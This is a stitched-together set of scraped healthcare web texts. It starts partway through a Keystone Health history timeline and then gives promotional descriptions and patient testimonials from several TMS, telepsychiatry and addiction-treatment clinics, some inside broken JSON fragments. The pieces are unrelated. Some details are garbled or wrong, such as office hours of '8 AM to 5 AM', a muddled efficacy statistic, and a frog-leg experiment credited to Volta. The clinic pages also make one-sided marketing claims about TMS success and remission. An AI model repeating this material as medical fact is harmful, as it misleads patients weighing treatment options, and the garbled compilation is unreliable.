Keystone passed the audit with no deficiencies. Keystone also underwent its 340B audit and passed that audit with no deficiencies.  Also, Keystone Internal Medicine developed a Coumadin program for all Keystone patients. Point of service testing is now available for our patients. In July, Dr. John Palm DDS joined Keystone along with his staff, and became the Dental Director of Keystone Dental Care. Keystone purchased A1C machines for our primary care practices, allowing our patients to obtain regular testing so they can better control their diabetes. The President declared the USA is in a National Opioid Crisis. A Keystone Crisis worker is now working with police departments by accompanying them to emergency crisis calls involving patients with mental health issues. This Crisis worker diffuses the situation and gets the individual the help he/she may need from the health system, not the criminal system. Keystone Women’s Care (Dr. Orndorf) began to provide MAT (Medication Assisted Therapy) to deal with the Opioid Crisis. In December, Keystone received Level 3 Patient Centered Medical Home recognition from NCQA for Keystone Family Medicine, Internal Medicine, Pediatrics and HIV. Cardiology was deleted from Keystone’s Scope of Services. In February, Keystone collaborated with Franklin County Head Start by placing a Head Start social worker to be placed within our Keystone Women’s Care office in order to register pregnant mothers into the Head Start program for the many advantages of early childhood intervention through Head Start programming. The program allows for mothers to begin participating in beneficial programs earlier, thus allowing them to reap more benefits available to both the mother and child. In early May, Keystone relocated its behavioral health program into a newly built facility at 110 Chambers Hill. Keystone celebrated with a ribbon cutting ceremony that same month with many community and state representatives present. In June, Keystone underwent its Operational Site Review with HRSA. Keystone was found to have no deficiencies, which was an outstanding outcome. In July, Keystone’s Community Responder Program obtained national recognition for its work with police departments in diverting individuals from jail to treatment centers. Also in July, Keystone broke ground for a new health center to be built on the corner of Norland and Fifth Avenues in Chambersburg. The building will house Keystone’s administration department, Keystone Urgent Care (relocating from 830 Fifth Ave), Keystone Pediatric Therapies (relocating from Scotland Ave), Keystone Pediatric Dentistry, Keystone Community Outreach (HIV/STD program, Family Planning and Infectious Disease services. Also in 2018, Keystone began to use TMS, Transcranial Magnetic Stimulation, in our Behavioral Health office for patients suffering from major depressive disorder. In May, Joint Commission visited Keystone Health. Keystone received continued accreditation. In June, HRSA (Health Resources and Services Administration) visited Keystone for our Federal Tort Claims Act Review (FTCA). Keystone did quite well. Also in early 2019, Keystone adopted Solution Reach, a platform that will enhance patient access and reputation management. Two way text based schedule requests and reminders are available for patients through the platform. This will allow for patients to confirm or reschedule appointments by text, and will also ask patients to complete post-visit surveys. In July, Keystone Health acquired two new local practices: Keystone Foot and Ankle Center and Keystone Chiropractic (formerly Susquehanna Chiropractic). Keystone received a grant from HRSA for Substance Abuse and Mental Health and part of the grant was slated for renovations at the Keystone Family Medicine practice, located at 820 Fifth Avenue. The renovation allowed for 12 additional exam rooms for primary care providers who will be providing Medication Assisted Treatment. In October of 2019, Keystone opened its newest facility at 111 Chambers Hill Drive, in Chambersburg. The facility houses Keystone Urgent Care, Keystone Pediatric Developmental Center (formerly Keystone Pediatric Therapies and Keystone Audiology and Speech) Keystone Infectious Diseases, Keystone Community Health Services (HIV/STD services and family planning) Keystone Pediatric Dental, and the Keystone Administration offices. In late 2019, the Keystone board approved the purchase of three lots on a 4.21 acre property in Waynesboro. Keystone plans to use this for future expansion which may include family medicine, dental and behavioral health in the greater Waynesboro community. 2020 2020 began like most other years, with our navigators being introduced to the Marketplace Medicare Insurance Plan as a service to offer our community in addition to Medicaid and CHIP. Keystone was awarded the Agency Partner Award from Franklin Together Re-Entry Coalition for its work in assisting formerly incarcerated individuals reintegrating back into the community, In March, Keystone received its report related to clinical data which showed that Keystone had improved in immunization and cancer screenings, asthma, colorectal cancer, coronary artery disease and lipid therapy along with improvements in administering dental sealants. In late March, our community  began to see the beginnings of COVID-19 impacting our community and our practices. In early April Keystone began screening all patients and employees. By mid-April, Keystone set up testing sites for our patients and community residents. Keystone worked to develop new ways of treating patients as well as many others from the community seeking testing. In mid-April there were 5,805 cases of COVID in Pennsylvania and 21 cases in Franklin County. Also in April, Keystone began offering telehealth appointments at most of its practices as a way for patients to access care without being seen in the office. In June, Dr. and Congressman John Joyce visited Keystone. November brought a new home for Keystone’s Agricultural Worker Program-  3375 Carlisle Road in Gardners, PA. Also in November, Keystone received Patient Medical Home Status (PCMH) for another three years for Family Medicine, Pediatrics, Internal Medicine and the HIV Program. In late December, Keystone vaccinated its first employee with the COVID-19 vaccine. 2021 Unfortunately, 2021 was a continuation of 2020 regarding COVID-19. However, there was one significant change—we now had a vaccine to combat the pandemic. Keystone began vaccinating healthcare workers in late 2020/early 2021. In February, Keystone’s focus began to shift from testing to vaccinating. Tier 1A vaccination began for individuals 65 and older and those with BMI >30. March saw falling numbers in COVID cases, and Keystone began to open vaccinations to the community. Also in March, Keystone developed an Advocacy Committee. In April, the Keystone Pharmacy began a prescription delivery program for patients. In June, Keystone’s long time Board Chairman Sam King resigned after over 30 years on Keystone’s board of directors. In July, Keystone Health made the decision to increase minimum wage for employees to $15 per hour. In November, Keystone began providing a third doses (booster doses), as well as monoclonal antibody therapy for those infected by COVID. Keystone was the only provider of this IV therapy in Chambersburg. 2022 The year began with a surge of the Omicron variant of COVID. Keystone once again did its part to keep our community healthy by administering vaccines and booster doses, and also hosted a drive-thru distribution event of masks and at-home tests. By spring, COVID numbers were declining and Keystone could begin to focus on other efforts. In response to the need for nurses in our community, Keystone provided tuition assistance for seven LPN students enrolled in the Franklin County Practical Nursing Program. Students were eligible for up to $16,000 in scholarship funds in exchange for working at Keystone upon graduation. In another effort to meet the needs of our community, Keystone began to develop a program to train medical assistants to become community health workers. These employees will be trained to do home visits for our patients who have difficulty getting to our offices, especially our elderly patients. They will assist with medication management, facilitating telehealth visits with the patients’ medical providers, obtaining vitals, and more. In July, Keystone reopened its Pediatric Dental practice which had been closed due to COVID as well as a lack of providers. Feedback from patients was positive, and Keystone was glad to once again provide this specialty service. Also this month The Health Resources & Services Administration conducted Keystone’s tri-annual Operational Performance Review. No deficiencies were found and Keystone was given high marks in all areas. Weeks later, Joint Commission arrived at Keystone Health for its unannounced tri-annual survey. Keystone performed very well and was given full accreditation. Construction began at 100 Chambers Hill Drive, a 35,000 square feet, two-story facility which will house Chiropractic, Foot and Ankle, a Behavioral Health extension, and a vaccine and education center. Keystone also hosted its annual Diabetes Fair, which had been on hiatus since 2019. The fair was open to the public and 80 community members received vitals, BMI screenings, foot and eye exams, education, healthy cooking lessons, resources, and more. Through all of the challenges of 2022, Keystone emerged stronger. Thanks to the dedication of our hard-working team, we continue to grow and expand in order to meet our community’s needs. 2023 This year presented some exciting expansion opportunities. LEECOM Osteopathic Medical School, WellSpan Family Medicine and Dental Residency Programs, Meritus Medical School, and Duquesne University expressed interest in partnering with Keystone for training and clinical experience for their medical students and residents. Keystone closed its COVID vaccine clinics as of 12/23/2022. However, vaccines remained available at the practice sites and at our Pharmacy. Keystone received dollars from the County Commissioners of ARPA for the purchase of Golds Gym with a plan to construct a Keystone site at the old Southgate Shopping Center. As a result of Keystone’s workforce development efforts, we partnered with NIMAA to begin providing medical assistant training and certification at Keystone. Students were selected after an application and interview process. October brought the opening of the 100 Chambers Hill Drive facility, housing Behavioral Health, Foot and Ankle, and Chiropractic. All five medical assistant students graduated from the NIMAA program and began working as MAs at various Keystone sites. 2024 Keystone Health and Franklin County Legal Services combined efforts and formed a Medical-Legal partnership to assist Keystone patients with their legal needs.​ Keystone Pediatric Developmental Center outgrew its space at 111 Chambers Hill Drive, and the program expanded by relocating some services to 110 Chambers Hill Drive. This location is now known as the Keystone Life Skills Center, and offers occupational and speech therapy services for patients ages 12-21. This program focuses on helping young people who have developmental challenges learn skills for adulthood, such as cooking, housework, budgeting, job readiness, and more. ​ Five more NIMAA students graduated, and they all began their Medical Assistant careers in Keystone practices. Keystone’s education efforts expanded to dental assistant trainees as well. The first class is scheduled to graduate in May 2025.​ Planning for Keystone’s future continued. Construction began for Keystone’s newest building, in downtown Chambersburg on Catherine Street. Plans for expanding needed services to the Waynesboro area were also underway.

This transformative treatment provides real, long-term results for people who haven’t found relief through anti-depressants. The team at Badlands TMS is here to help you on your journey to wellness! Dr. Brown is a pediatric and adult psychiatrist who has been working in Southern Oregon since 2011. He has a psychotherapy/medication management practice in addition to the TMS clinic. Dr. Brown completed his child and adolescent psychiatry fellowship at the Oregon Health Science University in Portland, OR. Prior to that he did his adult psychiatry residency at the University of Vermont Medical Center in Burlington, VT. Dr. Brown attended medical school at University of Texas Medical School in Houston, TX. He majored in biochemistry and molecular biology as an undergraduate at the University of Georgia. He enjoys spending time with his family, watching and coaching soccer, and hanging out in his backyard. Chewy has been a therapy dog since 2014 at the young age of 18 months. That is when he finally settled down and stopped destroying almost everything that came across his path. We believe he is a black Lab/Husky/Rottweiler mix. He is an extremely loving and slothful (better than calling him lazy?) dog that likes to lie on your feet and go right into REM sleep. He enjoys swimming, sleeping on his back with his legs up, laying around while the other dogs fetch, wrestling with his buddy Ani, chewing on bones, shedding on everything (lint roller provided at no extra cost), and giving kisses to his favorite people. Millie is the tiniest of our therapy dogs. When she’s at work, Millie has a calm energy that brings a sense of peace to all who meet her. During her free time, Millie enjoys being part of her pack, digging holes, chasing the other dogs while they’re playing fetch, getting major zoomies, and being close to her mama. Millie’s unique beauty and natural silver mohawk make almost everyone smile.

Locations in Oregon & Washington – Learn More While the overall efficacy of TMS is still being investigated, clinical studies seem to indicate that 67% of patients have a good response to TMS (i.e. get 50% better) and that 45% of patients with a good response (get 70% better). Typically these rates are maintained a year later. About 7% of our patients come back for re-treatment. The largest TMS trials have regularly included patients taking antidepressants concurrently with TMS therapy. There are no apparent safety risks to patients who take antidepressants before, during or after treatment with TMS. TMS therapy has been used since the mid-1980s in research settings to investigate the functioning of different parts of the brain. The first TMS device was developed in 1985 by Dr. Anthony Barker of Sheffield, England. It began to be investigated for use as an antidepressant therapy in the 1990s. Neuronetics, the makers of the Neurostar TMS device, sponsored a study in 2007 (O’Reardon, et al 2007) that showed the efficacy of TMS in treating Major Depressive Disorder. The device was eventually FDA cleared in 2008. A subsequent NIH study (George, et al 2010) largely replicated the industry-sponsored study (O’Reardon, et al 2007). Since then multiple studies have shown TMS treatment is effective in treating Major Depressive Disorder. Other studies have also shown promising results in other psychiatric and neurologic disorders. In 2013, Levkovitz, et al published a clinical trial that led to FDA approval of the deep TMS (dTMS) device made by Brainsway. Since then multiple studies have confirmed the efficacy of dTMS. Other indications have been FDA cleared recently, including anxious depression and OCD . Most other medications can also be taken before, during and after a course of TMS. There are some medications that can increase the seizure risk with TMS and these should be discussed with your TMS provider. About 7% of our patients come back for re-treatment.

        "self_description": "OPS Telehealth, sometimes called telemedicine, allows your health care providers to care for you without an in-person office visit. Telehealth is done primarily online with internet access on your computer, tablet, or smartphone. There are several options for telehealth care: The shortage of quality care and access to care across the country and the fear of the social stigma keeps many people from seeking out treatment for their mental health needs. The mental health community is beginning to realize that they need to redefine health care to successfully address the mental health issue on a national level. Advances in technology have made it possible to use telecommunications to provide behavioral health services, including telephone calls, text messages, electronic mail, images transmitted via fax machine, and real-time videoconferencing. Mental health treatment relies on conversation, emotional connection, and validation, making telemedicine a game-changer in the field. There are a few fundamental ways in which telemedicine, or telepsychiatry, is revolutionizing mental health care: As more and more people are beginning to realize the importance of mental health care in their overall wellbeing, we are realizing the shortage of mental health care professionals. This is directly related to geographic location. With telepsychiatry on the rise, mental health care professionals can now virtually treat patients that live hundreds of miles away, closing the gap between location disadvantages and available treatment. Accessibility involves more than the geographic location. Telemedicine opens the door to treatment for those who are mobile challenged, lack transportation options, and those who are recovering at home. As long as the patient has internet access, they will have access to treatment. Telehealth is a safe and convenient option for getting behavioral health care at home. You may be able to attend appointments without needing transportation, taking time off work, or arranging for childcare. Those factors can be important in a long-term treatment plan. While mental health treatment has become progressively more normalized, there is still a heavy stigma attached to it. Telemedicine has lifted mental health treatment into not only something  that is easily accessible but also destigmatized. Telepsychiatry contributes immensely to the destigmatization of mental health treatment by offering patients the comfortability of seeking treatment from the privacy of their own homes. Opioid addiction is at an all-time high, especially in rural areas with little to no access to mental health treatment. This calls for greater addiction treatment reform, which has been implemented in the form of telepsychiatry to provide the necessary resources to the areas with the greatest need. At Ohio Psychiatric Services we offer accessible and innovative care. Call us today at 740 201 6021 or book an appointment online for your virtual Telepsychiatry visit with our providers who are waiting to help you achieve the mental health that you deserve. Telehealth visits with OPS are similarly priced as in-office visits, and they are covered by most insurance carriers! At our practice we are dedicated to assisting each patient with a customized treatment plan that Is evidence based and proven to be effective at helping people see a reduction in their symptoms and improvement in their overall quality of life. 5551 Hilliard Rome Office Park Hilliard, Ohio 43026 Phone: (614) 407 0606 Monday to Friday 8 AM to 5 AM Saturday & Sunday Closed © Ohio Psychiatric Services and TMS Center.

Advaita Integrated Medicine offers buprenorphine and Vivitrol for patients who have decided, in collaboration with their medical provider, that Medication Assisted Therapy (MAT) is the best course of treatment. An integrated care model is one in which multiple healthcare needs can be addressed in one organization. Mental health and substance use issues are often the result of complicated and intersecting issues. This means that being in an integrated care model where your therapist, psychiatrist, and other treatment providers can collaborate will help give the best possible outcomes. Not everyone needs to have a therapist and psychiatrist, but having the option for that in one location can be supremely helpful. Yes!

Transcranial magnetic stimulation (TMS) uses a targeted pulsed magnetic field, similar to what is used in an MRI machine. While the patient is awake and alert, TMS Therapy stimulates areas of the brain that are underacting, causing depression. During the TMS procedure, the patient wears a padded helmet which activates the magnetic pulses. These repeated magnetic wave pulses reach the areas of the brain which are affected, stimulating the weakened neurotransmitters of the brain affecting depression. In-office TMS therapy treatment takes 6-19 minutes and is administered 5 days a week for approximately 4-6 weeks. Transcranial magnetic stimulation (TMS) uses a targeted pulsed magnetic field, similar to what is used in an MRI machine. While the patient is awake and alert, TMS Therapy stimulates areas of the brain that are underacting, causing anxiety, compulsive and obsessinve thinking and that can result in OCD. In August 2018, the FDA cleared Deep TMS for treating OCD. Special coils were developed to target the areas in the brain affected by OCD. The Deep TMS for OCD we use at LifeQuality TMS in Brooklyn, NY directly stimulates areas of the brain at greater depths within the brain, doing so safely and efficiently. That is why Deep TMS is the only TMS system that is approved by the FDA for OCD. Substance dependence and abuse is defined as intense cravings and uncontrollable desires to use certain substances. Substance use disorder (SUD) is considered a chronic psychological disorder and is prevalent among adult populations. The disorder can be categorized into 4 distinct categories, alcohol, nicotine, opioid, and illicit drug abuse. Transcranial magnetic stimulation (TMS) uses a targeted pulsed magnetic field, similar to what is used in an MRI machine, while the patient is awake and alert, to gradually increase or decrease activity in areas of the brain that are not properly balanced or connected, which effect cravings, substance dependencies and abuse. We have seen too many patients go from medication to medication with varying results and with never-ending side-effects. Excellent easy-to-get-to location: We are based in downtown Brooklyn at 26 Court Street. A major hub for public transportation with easy access to many buses, and subway lines. If you are struggling with depression, and medications are ineffective or you are experiencing any side-effects, we urge you to schedule your FREE phone consultation with our clinical coordinator to learn more about how Deep TMS Therapy can help to get your depression in remission and get your quality of life back. Call LifeQuality TMS at 718-4000-TMS, 718 400 0867 for a free consultation, and to have all of your questions answered. info@lifequalitytms.com (718) 400-0867 (718) 4000-TMS 26 Court St., Ste 1510 Brooklyn, NY 11201 At LifeQuality TMS we want to give you back your quality of life and unshackle you from the constant burden of your depression."

By using the Osmind platform for measurement-based care, we are following evidence-based practices that have been advocated for by experts for many years.

        "self_description": "With years of experience under our belt, our mental health clinic has been dedicated to helping individuals overcome depression. Our patient-centered approach combines proven treatments with compassionate care to empower you on your journey to a healthier, happier you. Oasis Mental Health Centers is a treasure for those struggling with depression, especially the treatment resistant variety. I must admit; that I was initially skeptical that anything could help me, considering I’ve done just about everything possible to treat my depression (i.e., medication, psychotherapy, etc.) However, TMS really helped restore my energy levels and removed the dark cloud over my head. The staff was very kind, caring, knowledgeable, and professional. My treater Sam really made me look forward to my sessions, and her enthusiasm and empathic attunement made the time go by quickly. As of today, I am depression-free and very thankful to have received treatment at TMS. Best experience! I would highly recommend to anyone suffering from depression & anxiety. I was apprehensive in fear of God forbid possibly feeling worse but it was a very positive experience for me. I feel better that ive ever felt before… it really works!! I’m down to half my dosage of the meds I’ve been taking for years & will eventually stop taking them completely… i want to thank the entire staff that treated me with kindness, compassion & an authentic concern for the suffering i dealt with all my life. I cannot thank the enough (Fairfield NJ office). The treatment’s changed my life! I had severe depression most of my life & i can’t believe how great I now feel!! Go for it, it will change your life!! This treatment was amazing! I haven’t felt this unburdened in years. I can almost function like my old energetic self. I still have work to do on me and my self care. But for the first time in a long time I truly have hope for a better future. The staff have been very kind, patient and informative. No question was ignored. And it was so great they shared in my milestones thru wellness. I would recommend this treatment to anyone suffering with severe/deep depression. It will change your life for the better! Special shout out to Kali, my main technician. Thank you for your positive attitude, energy & smile. And another shout out to Stephanie who is a great listener even when the words wouldn’t come out right! God Bless You Ladies! I’m struggled with depression most of my life and have been on different medications and nothing helped. I was on Google desperately looking for another options to help cope with my depression when I came across Oasis Mental Health Centers. Everyone there is very friendly, understanding and encouraging! I also got to meet Joie who was my treater and I couldn’t have been more lucky! Joie is an amazing person who makes you feel comfortable and want to go to each treatment! I’m very happy and I will miss going there every day! At first I was skeptical because I had gone 40 something years with nothing working but this really works. I feel significantly better about myself and future. Now mind you, this is not a magic cure. I still have my triggers and that is probably never going to change. What has changed is my reaction to them. I don’t fly off the handle anymore or allow anxiety to consume me. That said, a key part of my success is my treatment specialist Joi (pronounced jo-ee) Joi… wow! What can I say? She was a joy to work with! She made me want to come into treatment every day just to shoot the breeze with such a cool chick. Love the necklace that reads “Brat”. We clicked immediately and shared many of the same opinions, Joi is never at a loss As someone who has lived with major depression for most of their life, I know the heavy feeling of hopelessness that comes with it. My therapist recommended TMS and I was able to book a consultation the same week. As I am nearing the end of my treatment I must say it has been life changing in the best ways. I am able to remember things, make connections that I thought were lost and most of all, I feel hopeful for the first time. My consultation with Joseph was informative and I could tell that he cares about his patients and their well being, providing a tailored treatment plan for each individual. The technicians here are literal angels. Josette immediately made me feel welcome and I could be here all day! Telling you about TMS about the Positive things that’s helped me and my family. But this is my story you have your own to tell, I will say this is the best thing I have ever done ✅ for my inner growth. MH. The staff were so kind, caring, Understanding Life gets in the way. Melanie and NNP Kim started the first mapping and treatment which was all new to me I? coordinator Diane and Christy who helped me with insurance coverage. She worked really hard on it and didn’t give up, until she helped me. Natalie I was so helpful if i got in a jam or life happened, Amanda, Carrie Ann, Kim manager Lots of pretty real women and a pretty handsome Dr Radbill. One shop 🔴 stop Who really want to help all of you Mind Body and Soul. The real Honor is learning about a brother named BEST thing that has ever happened to me and my dad even said he could see it save my life. Fatigue lessened more than 70%, depression score went from a 22 to a 2, back to the gym, back to being present with my twins and husband. I’ve already referred two friends who got started! So easy to do on a lunch break. If you’re Medication resistant, highly recommend. The office is SO clean and welcoming. My tech Natalie and Ameris are earth angels and the doctor is incredibly knowledgeable taking time to listen to you. Take a chance on this – nothing to lose, everything to gain! After having no success with 13 different medications, I did not have high expectations that this treatment would do a lot for me. However I was pleasantly surprised to see drastic results by the end of my 36th session. Overall the experience was very successful for me. The treatment was effective, and I had a great experience with the technicians that I saw daily – Melanie and Natalie. They gave great advice when I asked for it, and were completely professional while helping to create a personable and friendly environment. would highly recommend Oasis Mental Health Centers to anyone that has been struggling with mental health, and has not had any luck with medications Completing the TMS program for my depression was quite a journey, and I’m extremely grateful for the people who made it a lot easier. Nora, the nurse who took care of me, was like having a supportive friend around. Every day, her kindness and caring attitude made going to the program less intimidating. She made a tough time in my life a bit brighter just by being there and showing she genuinely cared. Truly love and appreciate you Nora. Sam, my psychiatrist, was also a really nice person. He always listened and tried his best to give me advice and support. He was patient and helped me figure out things step by step. With his guidance, I felt like I was on the right path to feeling better. It’s a journey but this was a good start and progress… Oasis Mental Health Centers has a team of incredible people working there. I finished my treatment today and I feel way better than when I started. It’s nice to have hope that depression can be treated without pills which have never worked for me, or given me bad side effects. Every single treater at Oasis Mental Health Centers is beyond warm and welcoming. Sometimes I’d come in feeling down, and the treaters were always able to bump my mood up a bit. They work around your schedule and are always willing to accommodate however they can. The environment is comfortable and calming. I’d recommend this place to anyone who’s been dealing with treatment resistant depression. I started TMS with intense social anxiety and Sabina always made me feel so comfortable and safe. I owe so much to her and the team at Oasis Mental Health Centers!! I’m now the happiest l’ve been in years and I can’t thank Sabina enough for her support and encouragement. She really goes above and beyond for her patients!!! Phenomenal service and incredible results. Life changing for me after years of medications. I cant explain how dramatic the results are! This was a great experience for me. I’ve been depressed all my life. The treatments really helped me come out of a depression when meds did very little. I can’t say enough good things about the staff. They were all very welcoming and happy when I would show up. Nora treated me most of the time. I love Nora. She always has a positive outlook. I’m done with my treatments for now but this was a very positive experience for me. Actually, i’ll miss the staff. I went into this treatment feeling very hesitant due to some reviews I had reas on a forum and I shared my hesitation with the staff there. They were so reassuring and I am so glad that I stuck with it. I wasn’t sure if this would work but I am so happy to say that I feel so much better than I did when I began my treatment. However this review not only applies to the treatment itself but also the amazing staff at the Paramus location. These women are so supportive and compassionate. They immediately treated me like I was family and I felt so supported during my time there. I am so grateful to them all and I would recommend them to anyone that is struggling with depression. I am eternally grateful for helping me get a piece of myself back.

        "self_description": "About Dr. Robinson I have been in the private practice of psychiatry in Morristown for thirty years. Following my graduation from Harvard in 1975, and my graduation from medical school at Johns Hopkins in 1979, I planned to pursue a career in internal medicine. During my medical internship at the Baylor College of Medicine hospitals at the Texas Medical Center in Houston, I reconsidered my career path, and realized that the field of psychiatry offered the opportunity to help people deal with the challenges of depression and anxiety -- which were frequently underlying factors in their physical illnesses. I relocated to Washington, D.C. and entered the psychiatric residency program at the George Washington University Medical Center, at the dawn of a new era of psychopharmacological treatment. In 1983, following my final year at George Washington as Chief Resident in the outpatient department, I moved to New York and spent the next two years as a Clinical Instructor in Psychiatry at the Mount Sinai School of Medicine, working with patients with chronic illnesses (kidney disease and hemophilia) and providing psychiatric consultation to patients with other medical illnesses. Although working in an academic medical center was fascinating, I realized that my interests were more suited to patient care. In 1986, following a year in private practice in Metuchen, I joined the staff at Carrier Clinic in Belle Mead, New Jersey, where I was the Clinical Director of an inpatient unit and performed ECT (electroconvulsive therapy). In 1993, I established my private practice of psychiatry in Morristown. In 2018, I attended the Transcranial Magnetic Stimulation (TMS) Visiting Fellowship at the Duke University School of Medicine, and I have been treating patients with TMS since then. In addition to my private practice, I am a member of the medical staff at Morristown Medical Center, where I am the Vice-Chairman of the Department of Psychiatry and serve on the Medical Staff Credentials Committee. I am board certified in general psychiatry by the American Board of Psychiatry and Neurology, and I am a Life Fellow of the American Psychiatric Association. I am licensed to practice in New Jersey and New York."

        "self_description": "Transcranial magnetic stimulation (TMS) is a painless, non-invasive therapy designed for people who struggle with chronic, treatment-resistant mental illnesses. Researchers have found that a significant proportion (10-30%) of people with depression do not experience improvement with antidepressant medications. 1 Fortunately, scientists recently have discovered that TMS can effectively treat persistent depression where traditional drug therapies have failed. In fact, evidence suggests that up to 70.6% of people who complete a full TMS treatment will see improvement in their symptoms and to 41.2% will experience permanent remission, 2 releasing them from the devastating burden of depression—without the unpleasant side effects of antidepressants. Neurons transmit small electrical pulses signaling to release neurotransmitters Scientists believe prefrontal cortex neuron malfunction causes imbalanced release of neurotransmitters Before they could develop any effective treatment for depression, scientists first had to learn about the mechanisms that cause this mental illness. They discovered that brain cells (called neurons ) in the prefrontal cortex work by transmitting small electrical pulses to one another, signaling them to release chemicals called neurotransmitters. The brain relies on many different neurotransmitters to perform various important functions, and a healthy balance of three neurotransmitters in particular—called serotonin, dopamine, and norepinephrine —is critical for maintaining emotional health and wellbeing. When prefrontal cortex neurons malfunction, they may fail to send the appropriate electrical signals that stimulate a balanced release of these important neurotransmitters. Scientists believe that the subsequent chemical imbalance of serotonin, dopamine, and norepinephrine is responsible for depression. TMS works by helping these malfunctioning neurons release neurotransmitters into the brain. During a TMS treatment session for depression, a clinician positions a small magnetic coil near the top-front area of the patient’s head, directly above the prefrontal cortex. The coil releases small electromagnetic currents that simulate the body’s natural electric nerve impulses, signaling neurons to release the specific neurotransmitters involved in regulating depression. The technique is completely painless, and patients remain awake for the entire treatment session. Patients who undergo a full course of TMS typically receive 20 minutes of TMS per session, five times per week, for four to six weeks. 3 For many patients, this short, non-invasive treatment safely and conveniently alleviates stubborn symptoms of depression where traditional medications have failed. Alessandro Volta (1745-1827) on 10000 Lire 1984 Banknote from Italy. Italian physicist discovered electric activity in living organisms. While the procedure may seem like futuristic science fiction, scientists and inventors began laying the foundations of TMS more than 200 years ago. In 1790, an Italian scientist named Alessandro Volta studied the effects of electricity on the body by attaching frog legs to a metal gate. When lightning struck the gate, Volta observed that the frog legs twitched, leading him to conclude that bodies contain some kind of electrical activity—long before the formal discovery of electrical nerve impulses. In 1831, English scientist Michael Faraday significantly advanced our understanding of electromagnetism when he observed that electrical currents create magnetic fields and, vice versa, magnetic fields create electrical currents. When Faraday passed electric pulses though a metal coil, he found that the electrical current generated a magnetic field that could transmit a new electrical current into another coil nearby. 4 Although Faraday did not directly test the effects of electromagnetism on the human brain, his experiments demonstrated that electricity and magnetism can be converted back and forth to intentionally alter the energy state of nearby objects. The legacy of Volta’s and Faraday’s discoveries would go on to inform the basic scientific principles that make TMS possible today. By the late 1800s, innovators realized that the science of electricity and magnetism could play an important role in health care. Equipped with newfound knowledge that electrical impulses help to regulate brain functions, scientists set out to develop electricity-based treatments for disorders of the brain, both neurological and psychiatric. One of the earliest of these was electroconvulsive therapy (ECT), a procedure designed to treat schizophrenia and other psychiatric disorders, including treatment-resistant depression, by using direct electrical currents to intentionally trigger seizures in anesthetized patients. 5 Statue of Michael Faraday in Savoy Place, London. Faraday discovered that electrical currents can be transmitted via magnetic fields. ECT was a popular treatment for nearly 50 years after its invention in 1938, but the procedure remains controversial for its side effects, which include pain and permanent memory loss. The technique fell out of favor in the early 1980s when the development of antidepressant drugs offered a safer, more effective option for treating depression and other mental disorders. 6 Despite the widespread success of these medications, many psychiatrists remained troubled that some of their patients still experienced persistent depression that did not respond to antidepressant drugs. Scientists continued to refine electricity-based therapies, hoping to alleviate these patients of the debilitating burden of treatment-resistant depression without exposing them to the risks associated with ECT. Our Dr. Dalkilic with Anthony Barker, who first used TMS in 1985 for neurological and motor disorders. The answer came in 1985, when Anthony Barker used Faraday’s principles of electromagnetism to develop TMS, which uses a magnetized coil to stimulate electrical brain activity. Barker initially designed the technique for use on the brain’s motor cortex (which regulates body movements) , using TMS as a diagnostic tool for neurological and motor disorders. 4 Realizing that TMS was safe and highly effective, scientists began to test the effects of TMS on the prefrontal cortex and discovered that the treatment had significant benefits for people with psychiatric disorders. 4 Because the TMS device uses magnetic fields to alter the brain’s electrical signals, rather than the traditional ECT method of direct electrical stimulation, the new therapy offers a safer, non-invasive alternative for people seeking relief from treatment-resistant depression. In 2008, after a series of clinical trials to determine the safety and effectiveness of TMS, the Food and Drug Administration (FDA) formally approved TMS as a treatment protocol for medication-resistant major depressive disorder. 7 Follow-up trials determined that most patients who experienced depression remission after treatment with TMS sustained their remission for at least a year after treatment, and the few who experienced a relapse were able to achieve remission again with additional TMS sessions. 8 Dr. Dalkilic administering a session with Brainsway’s state of the art TMS machine during Covid-19 Era. Today, TMS remains a popular, effective option for treatment-resistant depression. More than 20 million TMS treatments have been performed since 2009, and the procedure is covered by most insurance plans. 9 The immense success of TMS for treating depression has inspired scientists to study the treatment for other mental disorders (including TMS for obsessive compulsive disorder (OCD), which received FDA approval in 2018 10 ), leading the charge to develop cutting-edge technologies that support and serve the needs of people with persistent mental health conditions. 1 Al-Harbi KS.

        "self_description": "Clinical Trial Opportunities Healthy Perspectives is conducting clinical trials using a wide range of pharmacological agents and devices to treat patients with severe mental Illness. This stems from our belief that, despite impressive progress, much is still needed to be done to provide safer and more effective treatments to help the population we serve. These efforts are best conducted in the context of patient/clinician/investigator relationships. Clinical trials offer many advantages in addition to availability of novel treatments. The trials provide a sound scientific approach to clinical care guided by treatment protocols that ensure the safety and effectiveness of the treatment being utilized. Our patients feel empowered by the “collaborator” status and often appreciate the rigors of such trials (frequent visits, safety measures, and hope of a better response to treatment). All our treatments are free of charge, not an insignificant factor in our current environment. In our efforts, we collaborate with other providers, community mental health centers, family members, and support groups. Over the many years that we have conducted trials, we have been able to bring treatments for Schizophrenia such as Clozapine, Olanzapine, Seroquel, Aripiprazole, Geodon, and Risperidone to our community before their general release. We have also conducted trials for other illnesses such as Depression, PTSD, Alzheimer ’s Disease, Migraine Headaches, Anxiety Disorders, Attention Deficit Disorder, Bipolar Illness, Alcohol and Opiate Dependence.

        "self_description": "At St. Cloud TMS, we offer a warm atmosphere for people looking to better their life. Whether it’s with TMS, Spravato treatments, or psychiatry, we want all patients to know that this is a safe, welcoming space. Come as you are, and we’ll grow together. Our clinic offers telehealth psychiatry with our partnered providers, as well as in-office treatments. Have you been struggling and haven’t found a solution? Have you heard of the brands below? WE HAVE . It’s insanity to try the same thing over and over, expecting different results. It’s time to try something new. St. Cloud TMS treats patients with either a Brainsway system, or a MagVenture system. Both offer Theta Burst Stimulation (TBS) through repetitive transcranial magnetic stimulation (TMS). It’s a safe, effective way to treat depression under a shorter timeline. The Brainsway system offers deep TMS, which targets deeper brain structures than the traditional 8-coil system, which we use with MagVenture. Both are great holistic treatments that require no downtime, and little to no side effects. Treatments are no longer than 5 minutes typically, though some require 20 minutes. Patients can also opt to receive the longer 20-minute session if they’d like with both machines. TMS results at our St. Cloud location are outstanding. 80% or more of our patients say that this treatment worked better than any medication they ever tried to alleviate their depression. Many say that it also helped with their anxiety, cravings, sleep, and memory. There are different protocols, but most insurances will cover TMS for depression with a prior authorization. We do the hard part, so you can finally find relief! Medication isn’t a bad thing – in fact, it works better in conjunction with our holistic alternatives. St. Cloud is offering the option of telehealth or in person appointments for psychiatry, including medication management, genetic testing for medication absorption, and referring to Spravato, sleep studies, TMS, in house Alpha Stim purchases and trials, and eventually IV Ketamine. Maybe you’re looking for a second opinion from an expert. We choose to live rurally, but that doesn’t mean you are stuck seeing someone who doesn’t have the expertise to navigate you through a new treatment modality. Our providers are also constantly 